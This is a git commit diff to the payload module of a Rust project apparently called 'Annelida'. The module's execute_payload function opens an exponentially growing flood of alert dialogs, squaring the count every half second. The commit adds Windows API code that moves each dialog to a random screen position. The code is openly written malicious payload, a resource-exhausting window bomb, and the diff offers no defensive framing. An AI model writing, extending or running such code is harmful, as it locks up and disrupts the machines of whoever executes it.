1d13a6a784244302c286ff5191219aa1eac98b40
William Knight <williamknight220@gmail.com>
2024-08-17 16:24:55 +1200

    Updates payload functionality

--- src/payload/message.rs
+++ src/payload/message.rs
@@ -1,6 +1,8 @@
 use std::thread;
 use std::time::Duration;
 use native_dialog::{MessageDialog, MessageType};
+use winapi::um::winuser::{FindWindowA, SetWindowPos, SWP_NOSIZE};
+use rand::Rng;
 
 // Function to exponentially increase the number of windows that open
 pub fn execute_payload() {
@@ -11,8 +13,8 @@ pub fn execute_payload() {
                 message();
             });
         }
-        count+=1;
-        count*=count;
+        count += 1;
+        count *= count;
         thread::sleep(Duration::from_secs_f32(0.5));
     }
 }
@@ -24,4 +26,15 @@ fn message() {
         .set_title("Annelida")
         .set_text("Temporary payload message :3")
         .show_alert().unwrap();
+
+    // Set the window position to a random location
+    let hwnd = unsafe { FindWindowA(std::ptr::null(), "Annelida\0".as_ptr() as *const i8) };
+    if !hwnd.is_null() {
+        let mut rng = rand::thread_rng();
+        let x = rng.gen_range(0..1920);
+        let y = rng.gen_range(0..1080);
+        unsafe {
+            SetWindowPos(hwnd, std::ptr::null_mut(), x, y, 0, 0, SWP_NOSIZE);
+        }
+    }
 }
